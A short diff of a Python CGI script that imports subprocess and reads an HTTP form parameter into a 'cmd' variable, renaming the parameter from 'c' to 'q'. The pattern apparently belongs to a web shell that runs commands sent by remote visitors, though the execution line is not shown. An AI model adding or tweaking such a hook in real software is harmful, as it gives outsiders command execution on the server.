@@ -5,4 +5,4 @@ print()
 import cgi
 import subprocess
 form = cgi.FieldStorage()
-cmd = form.getvalue("c")
+cmd = form.getvalue("q")
